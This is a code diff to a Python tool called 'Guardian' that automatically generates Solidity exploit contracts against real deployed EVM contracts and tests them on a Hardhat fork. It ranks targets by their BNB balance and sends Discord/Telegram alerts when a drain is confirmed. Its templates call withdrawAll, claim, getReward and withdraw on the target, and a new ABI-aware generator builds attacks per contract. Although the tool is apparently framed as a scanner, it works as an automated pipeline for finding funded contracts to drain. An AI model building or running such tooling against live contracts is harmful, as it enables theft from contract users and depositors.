@@ -50,6 +50,8 @@ from scanner.orchestrator import ScannerOrchestrator
 from analysis.vulnerability_scanner import VulnerabilityFinding
 from exploit_pipeline import ExploitPipeline, CHAIN_REGISTRY
 from confirmators.mythril_confirmator import MythrilConfirmator
+from exploit_generator import ABIBasedExploitGenerator
+from alerting import AlertManager, AlertEvent
 
 logging.basicConfig(
     level=logging.INFO,
@@ -374,7 +376,8 @@ class HardhatValidator:
     # Default RPC URLs from CHAIN_REGISTRY (fallback)
     DEFAULT_RPC_URLS = {k: v[2] for k, v in CHAIN_REGISTRY.items()}
 
-    def __init__(self, db: FindingsDB, exploit_dir: str = "", rpc_urls: Optional[dict[int, str]] = None):
+    def __init__(self, db: FindingsDB, exploit_dir: str = "", rpc_urls: Optional[dict[int, str]] = None,
+                 api_key: str = ""):
         self.db = db
         self.exploit_dir = exploit_dir or os.path.join(
             os.path.dirname(os.path.abspath(__file__)), "exploit"
@@ -384,6 +387,9 @@ class HardhatValidator:
         os.makedirs(self.exploit_dir, exist_ok=True)
         # Track spawned subprocesses so we can kill them on timeout/shutdown
         self._processes: set[asyncio.subprocess.Process] = set()
+        # ABI-aware exploit generator (lazy init, uses api_key from Guardian config)
+        self._abi_generator: Optional[ABIBasedExploitGenerator] = None
+        self._abi_api_key: str = api_key
 
     async def _run_and_track(self, *args, **kwargs) -> asyncio.subprocess.Process:
         """Spawn a subprocess and track it for later cleanup."""
@@ -483,20 +489,38 @@ class HardhatValidator:
             except Exception as e:
                 return {"killed": 0, "error": str(e)}
 
-    def _generate_exploit_contract(self, target_addr: str, finding_name: str, finding_type: str, index: int = 0) -> str:
+    async def _generate_exploit_contract(self, target_addr: str, finding_name: str, finding_type: str, index: int = 0, chain_id: int = 56) -> str:
         """Generate a Solidity exploit contract for a given finding type.
+
+        Uses ABI-aware generation when possible (fetch real ABI from explorer),
+        falls back to generic templates when ABI not available.
 
         Args:
             target_addr: Contract address to attack
             finding_name: Human-readable finding name (for logging)
             finding_type: Finding type/key used to select the exploit template
             index: Unique index to prevent contract name collisions across findings
+            chain_id: EVM chain ID for ABI fetching
 
         Returns the Solidity source code as a string.
         """
-        # Common exploit template with different attack patterns
-        # Use a unique name based on index to avoid name collisions at compile time.
-        # Name format: Exploit_N (where N is the finding's index in the list)
+        # Try ABI-aware generation first (with API key for Etherscan)
+        if self._abi_generator is None:
+            self._abi_generator = ABIBasedExploitGenerator(api_key=self._abi_api_key)
+
+        try:
+            abi_exploit = await self._abi_generator.generate_exploit(
+                target_addr, chain_id, finding_type, index
+            )
+            if abi_exploit:
+                # Check that it's not the generic fallback (the generator returns
+                # a string for both ABI and fallback templates)
+                logger.info(f"[ABI-GEN] Generated exploit for {target_addr[:14]}.. (idx={index})")
+                return abi_exploit
+        except Exception as e:
+            logger.debug(f"[ABI-GEN] Failed, falling back to generic: {e}")
+
+        # Fallback: generic templates (original behavior)
         contract_name = f"Exploit_{index}"
 
         if "reentrancy" in finding_type.lower():
@@ -593,19 +617,9 @@ class HardhatValidator:
                 f"    }}\n\n"
                 f"    function attack() external {{\n"
                 f"        require(msg.sender == owner, \"!owner\");\n"
-                f"        // Low-level calls with common function selectors:\n"
-                f"        // - 0x853828b6 = withdrawAll()\n"
-                f"        // - 0x4e71d92d = claim()\n"
-                f"        // - 0x3d18b912 = getReward()\n"
-                f"        // - 0x2e1a7d4d = withdraw(uint256)\n"
-                f"        // Low-level calls don't revert if function doesn't exist\n"
-                f"        // solhint-disable-next-line avoid-low-level-calls\n"
                 f"        (bool s1,) = target.call(abi.encodeWithSignature(\"withdrawAll()\")); s1;\n"
-                f"        // solhint-disable-next-line avoid-low-level-calls\n"
                 f"        (bool s2,) = target.call(abi.encodeWithSignature(\"claim()\")); s2;\n"
-                f"        // solhint-disable-next-line avoid-low-level-calls\n"
                 f"        (bool s3,) = target.call(abi.encodeWithSignature(\"getReward()\")); s3;\n"
-                f"        // solhint-disable-next-line avoid-low-level-calls\n"
                 f"        (bool s4,) = target.call(abi.encodeWithSignature(\"withdraw(uint256)\", 0)); s4;\n"
                 f"        attacked = true;\n"
                 f"    }}\n"
@@ -836,7 +850,7 @@ main().then(() => process.exit(0)).catch(e => {{
 
         try:
             # Write exploit contract
-            exploit_sol = self._generate_exploit_contract(contract_addr, finding_name, finding_type)
+            exploit_sol = await self._generate_exploit_contract(contract_addr, finding_name, finding_type, chain_id=chain_id)
             # Extract contract name from source for Hardhat compilation
             contract_name_match = re.search(r"contract\s+(\w+)", exploit_sol)
             contract_name = contract_name_match.group(1) if contract_name_match else "Exploit"
@@ -992,8 +1006,8 @@ main().then(() => process.exit(0)).catch(e => {{
             #    Each gets a unique index to prevent contract name collisions at compile time
             exploit_contracts: list[tuple[str, str, str]] = []  # (finding_name, contract_name, sol_code)
             for idx, finding in enumerate(findings):
-                sol_code = self._generate_exploit_contract(
-                    contract_addr, finding["finding_name"], finding["finding_name"], index=idx
+                sol_code = await self._generate_exploit_contract(
+                    contract_addr, finding["finding_name"], finding["finding_name"], index=idx, chain_id=chain_id
                 )
                 name_match = re.search(r"contract\s+(\w+)", sol_code)
                 contract_name = name_match.group(1) if name_match else "Exploit"
@@ -1084,6 +1098,7 @@ main().then(() => process.exit(0)).catch(e => {{
                     )
                 results.append({
                     "contract": contract_addr,
+                    "chain_id": chain_id,
                     "finding": fn_name,
                     "result": fn_result,
                     "evidence": fn_evidence[:200],
@@ -1193,12 +1208,13 @@ class Guardian:
 
         # Build RPC URLs from config.yaml (includes Infura secret) for Hardhat fork
         rpc_urls: dict[int, str] = {}
+        api_key = self.config.get("global", {}).get("explorer_api_key", "")
         for chain_key, chain_cfg in self.config.get("chains", {}).items():
             cid = chain_cfg.get("chain_id")
             rpc = chain_cfg.get("rpc_http", "")
             if cid and rpc:
                 rpc_urls[cid] = rpc
-        self.hardhat = HardhatValidator(self.db, rpc_urls=rpc_urls or None)
+        self.hardhat = HardhatValidator(self.db, rpc_urls=rpc_urls or None, api_key=api_key)
         self.orchestrator: Optional[ScannerOrchestrator] = None
         self.running = False
         self.stop_event = asyncio.Event()
@@ -1216,6 +1232,9 @@ class Guardian:
             else:
                 logger.warning("[MYTHRIL] --with-mythril specified but Mythril CLI not found")
                 self.mythril = None
+
+        # Alert manager (Discord + Telegram from config)
+        self.alert_manager = AlertManager(config=self.config)
 
         # Stats (cumulative across runs)
         self.stats = {
@@ -1389,6 +1408,24 @@ class Guardian:
                     logger.critical(f"[!!!] EXPLOIT CONFIRMED on {r['contract'][:14]}.. via {r['finding']}!")
                     self.db.log_event("EXPLOIT", "backfill",
                         f"CONFIRMED on {r['contract']} via {r['finding']}")
+                    # Alerte Discord/Telegram
+                    try:
+                        contract = self.db.get_contract(r['contract'], r.get('chain_id', 0))
+                        balance = contract['bnb_balance'] if contract else 0
+                        chain_name = contract['chain_name'] if contract else 'backfill'
+
+                        await self.alert_manager.send_exploit_confirmed(
+                            contract_address=r['contract'],
+                            chain_name=chain_name,
+                            finding_name=r['finding'],
+                            severity="CRITICAL",
+                            evidence=r['evidence'][:500],
+                            balance=balance,
+                            extra={"source": "backfill", "chain_id": str(r.get('chain_id', 0))}
+                        )
+                    except Exception as alert_e:
+                        logger.error(f"[ALERT] Backfill alert error: {alert_e}")
+
                 if confirmed:
                     alarm_path = os.path.join(
                         os.path.dirname(os.path.abspath(__file__)),
@@ -1558,36 +1595,67 @@ class Guardian:
             if found_exploitable:
                 self.db.upsert_contract(contract)
 
-            # Auto-validate on Hardhat if exploitable (in force mode, skip balance check)
-            if found_exploitable and (self.force_hardhat or contract.bnb_balance > 0.001):
-                bal_info = f"bal={contract.bnb_balance:.4f}" if contract.bnb_balance > 0 else "bal=0 (forced)"
-                logger.info(f"[HARDHAT] Auto-validating ({bal_info})...")
-                results = await self.hardhat.validate_all_pending()
-                for r in results:
-                    if r["result"] == "CONFIRMED":
-                        self.stats["exploits_confirmed"] += 1
-                        self.db.log_event("EXPLOIT", chain_name,
-                            f"CONFIRMED on {r['contract']} via {r['finding']}: {r['evidence'][:200]}")
-                        logger.critical(
-                            f"[!!!] EXPLOIT CONFIRMED on {r['contract'][:14]}.. "
-                            f"via {r['finding']}! Evidence: {r['evidence'][:200]}"
-                        )
-                        # Write to alarm file
-                        alarm_path = os.path.join(
-                            os.path.dirname(os.path.abspath(__file__)),
-                            "guardian_exploits_found.txt"
-                        )
-                        with open(alarm_path, "a") as f:
-                            f.write(f"\n{'='*60}")
-                            f.write(f"\n[!!!] EXPLOIT CONFIRMED at {datetime.utcnow().isoformat()}")
-                            f.write(f"\nContract: {r['contract']}")
-                            f.write(f"\nChain: {chain_name} ({chain_id})")
-                            f.write(f"\nFinding: {r['finding']}")
-                            f.write(f"\nBalance: {contract.bnb_balance:.4f}")
-                            f.write(f"\nEvidence: {r['evidence']}")
-                            f.write(f"\n{'='*60}\n")
-            elif found_exploitable:
-                logger.info(f"[HARDHAT] Skipping: balance={contract.bnb_balance:.4f} (< 0.001, use --force-hardhat to override)")
+            # === PRIORITÉ: test Hardhat IMMÉDIAT si CRITICAL/HIGH avec balance > 0 ===
+            if found_exploitable:
+                has_critical_high = any(
+                    f.severity in ("CRITICAL", "HIGH")
+                    for f, v in zip(report.findings, report.validations)
+                    if v.theoretically_exploitable
+                )
+
+                if has_critical_high and (self.force_hardhat or contract.bnb_balance > 0.001):
+                    bal_info = f"bal={contract.bnb_balance:.4f}" if contract.bnb_balance > 0 else "bal=0 (forced)"
+                    logger.warning(f"[HARDHAT] PRIORITY test immédiat ({bal_info})...")
+
+                    # Test ONLY this contract's findings (not all pending)
+                    this_contract_findings = self.db.get_exploitable_not_tested_for_addresses([
+                        (addr, chain_id)
+                    ])
+                    if this_contract_findings:
+                        try:
+                            results = await self.hardhat.validate_contract(this_contract_findings)
+                            for r in results:
+                                if r["result"] == "CONFIRMED":
+                                    self.stats["exploits_confirmed"] += 1
+                                    self.db.log_event("EXPLOIT", chain_name,
+                                        f"CONFIRMED on {r['contract']} via {r['finding']}: {r['evidence'][:200]}")
+                                    logger.critical(
+                                        f"[!!!] EXPLOIT CONFIRMED on {r['contract'][:14]}.. "
+                                        f"via {r['finding']}! Evidence: {r['evidence'][:200]}"
+                                    )
+
+                                    # === ALERTE Discord/Telegram ===
+                                    await self.alert_manager.send_exploit_confirmed(
+                                        contract_address=r['contract'],
+                                        chain_name=chain_name,
+                                        finding_name=r['finding'],
+                                        severity="CRITICAL",
+                                        evidence=r['evidence'][:500],
+                                        balance=contract.bnb_balance,
+                                        extra={"chain_id": str(chain_id)}
+                                    )
+
+                                    # Write to alarm file
+                                    alarm_path = os.path.join(
+                                        os.path.dirname(os.path.abspath(__file__)),
+                                        "guardian_exploits_found.txt"
+                                    )
+                                    with open(alarm_path, "a") as f:
+                                        f.write(f"\n{'='*60}")
+                                        f.write(f"\n[!!!] EXPLOIT CONFIRMED at {datetime.utcnow().isoformat()}")
+                                        f.write(f"\nContract: {r['contract']}")
+                                        f.write(f"\nChain: {chain_name} ({chain_id})")
+                                        f.write(f"\nFinding: {r['finding']}")
+                                        f.write(f"\nBalance: {contract.bnb_balance:.4f}")
+                                        f.write(f"\nEvidence: {r['evidence']}")
+                                        f.write(f"\n{'='*60}\n")
+
+
+                        except Exception as e:
+                            logger.error(f"[HARDHAT] Priority test error: {e}")
+                elif found_exploitable:
+                    logger.info(f"[HARDHAT] Priority skip: balance={contract.bnb_balance:.4f} "
+                                f"(< 0.001 or no CRITICAL/HIGH, use --force-hardhat)")
 
         # Mythril confirmation (optional — only if --with-mythril)
         if self.mythril and report and report.findings:
@@ -1656,6 +1724,20 @@ class Guardian:
         self.db.connect()
         self.db.log_event("START", "all", "Guardian started")
 
+        # Envoyer une alerte de demarrage pour verifier le webhook Discord
+        start_event = AlertEvent(
+            event_type="GUARDIAN_START",
+            severity="HIGH",
+            title="🛡️ Guardian demarre",
+            description=f"Scanning {len(target_chains) if target_chains else 'toutes les'} chaine(s) depuis {datetime.utcnow().isoformat()}",
+            chain_name=", ".join(target_chains) if target_chains else "all",
+            extra_fields={
+                "hardhat": "FORCE" if force_hardhat else "normal",
+                "mythril": "ON" if self.mythril else "OFF",
+            }
+        )
+        await self.alert_manager.send(start_event)
+
         # Enable only targeted chains (or all if not specified)
         for chain_key in self.config.get("chains", {}):
             if target_chains:
@@ -1711,6 +1793,36 @@ class Guardian:
                             if r["result"] == "CONFIRMED":
                                 self.stats["exploits_confirmed"] += 1
                                 logger.critical(f"[!!!] EXPLOIT CONFIRMED on {r['contract'][:14]}.. via {r['finding']}!")
+                                # Alerte Discord/Telegram + alarm file
+                                try:
+                                    contract = self.db.get_contract(r['contract'], r.get('chain_id', 0))
+                                    balance = contract['bnb_balance'] if contract else 0
+                                    chain_name = contract['chain_name'] if contract else 'unknown'
+
+                                    await self.alert_manager.send_exploit_confirmed(
+                                        contract_address=r['contract'],
+                                        chain_name=chain_name,
+                                        finding_name=r['finding'],
+                                        severity="CRITICAL",
+                                        evidence=r['evidence'][:500],
+                                        balance=balance,
+                                        extra={"source": "periodic-loop"}
+                                    )
+
+                                    alarm_path = os.path.join(
+                                        os.path.dirname(os.path.abspath(__file__)),
+                                        "guardian_exploits_found.txt"
+                                    )
+                                    with open(alarm_path, "a") as f:
+                                        f.write(f"\n{'='*60}")
+                                        f.write(f"\n[PERIODIC LOOP] EXPLOIT CONFIRMED at {datetime.utcnow().isoformat()}")
+                                        f.write(f"\nContract: {r['contract']} on {chain_name}")
+                                        f.write(f"\nFinding: {r['finding']}")
+                                        f.write(f"\nBalance: {balance:.4f}")
+                                        f.write(f"\nEvidence: {r['evidence'][:200]}")
+                                        f.write(f"\n{'='*60}\n")
+                                except Exception as alert_e:
+                                    logger.error(f"[ALERT] Error sending exploit alert: {alert_e}")
                     except Exception as e:
                         logger.error(f"[HARDHAT] Periodic validation error: {e}")
 
